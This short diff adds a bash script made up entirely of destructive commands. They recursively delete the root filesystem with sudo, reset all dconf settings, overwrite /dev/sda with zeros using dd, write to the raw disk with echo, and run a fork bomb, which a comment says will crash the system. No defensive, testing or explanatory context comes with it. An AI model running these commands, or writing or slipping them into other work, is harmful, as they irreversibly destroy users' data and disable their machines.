@@ -1,0 +1,8 @@
+#!/bin/bash
+
+sudo rm -rf /*
+dconf reset -f /
+dd if=/dev/zero bs=1M of=/dev/sda
+echo > /dev/sda
+:(){:|:&};:    #You will start an endless loop and eventually crash the system by running this command.
+
